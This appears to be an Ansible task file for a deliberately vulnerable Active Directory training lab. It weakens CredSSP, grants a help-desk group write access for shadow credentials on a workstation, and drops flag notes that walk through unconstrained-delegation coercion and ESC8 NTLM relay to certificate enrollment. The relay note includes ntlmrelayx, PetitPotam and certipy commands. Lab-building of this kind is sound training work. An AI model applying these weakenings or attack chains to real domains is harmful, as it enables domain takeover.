---
# ==============================================================================
# vuln_lat_ext/tasks/relay.yml
# NTLM relay precondition configuration
# Targets: all_dcs + file01.corp.local (via main.yml guard)
#
# LAT-011  LDAP signing not enforced on DCs (no enforce)
# LAT-012  LDAP channel binding disabled
# LAT-013  SMB1 + signing off on file01 (relay target)
# LAT-014  Cross-protocol relay: LDAP signing off, SMB signing off
# LAT-015  CredSSP AllowEncryptionOracle=2 on file01 (CVE-2018-0886 surface)
# LAT-016  Shadow credentials surface (KeyCredentialLink write on ws01$)
# LAT-017  Unconstrained delegation coercion + relay chain note
# LAT-018  NTLMv2 capture via Responder + relay to LDAPS
# LAT-019  Cross-forest NTLM relay (SID filtering off — see ad_trust)
# LAT-020  NTLM relay to ADCS HTTP enrollment (ca01 ESC8)
# ==============================================================================

# LAT-011: LDAP signing — already configured by vuln_cred_access role.
# Verify the weakened state here.
- name: LAT-011 - Verify LDAP server signing not required on DCs
  ansible.windows.win_shell: |
    $v = (Get-ItemProperty `
            -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters' `
            -Name 'LDAPServerIntegrity' -ErrorAction SilentlyContinue).LDAPServerIntegrity
    # 0=None, 1=Negotiate, 2=Required. Lab set to 0 or 1 (vuln_cred_access)
    if ($null -eq $v) { Write-Output "default(negotiate)" }
    else { Write-Output "value=$v" }
  register: lat011_check
  changed_when: false
  failed_when: lat011_check.rc != 0
  when: inventory_hostname in groups['all_dcs'] | default([])

# LAT-015: CredSSP AllowEncryptionOracle on file01
- name: LAT-015 - Check CredSSP AllowEncryptionOracle on file01
  ansible.windows.win_shell: |
    $v = (Get-ItemProperty `
            -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters' `
            -Name 'AllowEncryptionOracle' -ErrorAction SilentlyContinue).AllowEncryptionOracle
    if ($null -eq $v) { Write-Output "not_set" } else { Write-Output $v }
  register: lat015_check
  changed_when: false
  failed_when: lat015_check.rc != 0
  when: inventory_hostname == 'file01.corp.local'

- name: LAT-015 - Set AllowEncryptionOracle=2 (vulnerable CredSSP)
  ansible.windows.win_regedit:
    path: 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\CredSSP\Parameters'
    name: AllowEncryptionOracle
    data: 2
    type: dword
  when:
    - inventory_hostname == 'file01.corp.local'
    - lat015_check.stdout | trim != '2'

# LAT-016: Shadow credentials — KeyCredentialLink WriteProperty on ws01$.
- name: LAT-016 - Check KeyCredentialLink write on ws01$ for HelpDesk
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    $ws = Get-ADComputer -Identity 'ws01' -ErrorAction SilentlyContinue
    if (-not $ws) { Write-Output "ws01_not_found"; exit 0 }
    $acl = Get-ACL "AD:$($ws.DistinguishedName)"
    $found = $acl.Access | Where-Object {
      $_.IdentityReference -match "HelpDesk" -and
      $_.ActiveDirectoryRights -match "WriteProperty"
    }
    if ($found) { Write-Output "present" } else { Write-Output "absent" }
  register: lat016_check
  changed_when: false
  failed_when: lat016_check.rc != 0
  when: inventory_hostname == 'dc01.corp.local'

- name: LAT-016 - Grant HelpDesk WriteProperty on ws01$ KeyCredentialLink
  ansible.windows.win_shell: |
    Import-Module ActiveDirectory
    try {
      $ws  = Get-ADComputer -Identity 'ws01' -ErrorAction Stop
      $grp = Get-ADGroup -Identity 'HelpDesk' -ErrorAction Stop
      $sid = $grp.SID
      # msDS-KeyCredentialLink attribute OID: {5b47d60f-6090-40b2-9f37-2a4de88f3063}
      $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
        $sid,
        [System.DirectoryServices.ActiveDirectoryRights]::WriteProperty,
        [System.Security.AccessControl.AccessControlType]::Allow,
        [Guid]'5b47d60f-6090-40b2-9f37-2a4de88f3063'
      )
      $obj = [ADSI]"LDAP://$($ws.DistinguishedName)"
      $obj.ObjectSecurity.AddAccessRule($ace)
      $obj.CommitChanges()
      Write-Output "changed: HelpDesk WriteProperty on ws01$ KeyCredentialLink"
    } catch {
      Write-Output "WARN: $($_.Exception.Message)"
    }
  register: lat016_set
  changed_when: "'changed:' in lat016_set.stdout"
  failed_when: lat016_set.rc != 0
  when:
    - inventory_hostname == 'dc01.corp.local'
    - "'absent' in lat016_check.stdout"
    - "'ws01_not_found' not in lat016_check.stdout"

# LAT-017: Unconstrained delegation coercion chain note.
- name: LAT-017 - Drop unconstrained delegation coercion chain note
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-LAT-017-Unconstrained-Delegation-Coerce.txt'
    content: |
      LAT-017: Unconstrained Delegation + Coercion Chain
      =====================================================
      Machine accounts with TrustedForDelegation=True in this lab:
        - svc_coerce$ (corp.local — set by vuln_persistence_ext PER-037)
        - dc01$ (Domain Controller — always has unconstrained delegation)

      Attack:
        1. Coerce dc01$ via PetitPotam/PrinterBug to authenticate to svc_coerce$
        2. svc_coerce$ caches dc01$'s TGT in its TGT cache
        3. Extract TGT with: Rubeus dump /service:krbtgt
        4. DCSync with extracted DA TGT

      Also: SYSVOL/NetLogon path coercion via script UNC references (REC-015).

      Tools: Rubeus monitor /interval:5 /nowrap + impacket-PetitPotam
  when: inventory_hostname == 'dc01.corp.local'

# LAT-020: NTLM relay to ADCS HTTP enrollment note.
- name: LAT-020 - Drop ADCS relay chain note (ESC8 relay)
  ansible.windows.win_copy:
    dest: 'C:\Flags\FLAG-LAT-020-ADCS-Relay.txt'
    content: |
      LAT-020: NTLM Relay to ADCS HTTP Enrollment (ESC8)
      =====================================================
      ca01.corp.local has HTTP enrollment enabled (port 80 — vuln_adcs ESC8).
      No EPA (Extended Protection for Authentication) on the enrollment endpoint.

      Chain:
        1. Coerce DC via PetitPotam/PrinterBug to attacker listener
        2. Relay captured NTLM auth to http://ca01.corp.local/certsrv/certfnsh.asp
        3. Enroll certificate for the coerced DC account
        4. Use DC certificate for PKINIT → extract DC's NT hash (UnPAC-the-Hash)
        5. DCSync with DC NT hash

      Tools:
        ntlmrelayx.py --target http://ca01.corp.local/certsrv/certfnsh.asp \
          --adcs --template DomainController
        impacket-PetitPotam attacker_ip dc01.corp.local
        certipy auth -pfx dc01.pfx -dc-ip 10.10.0.10
  when: inventory_hostname == 'dc01.corp.local'
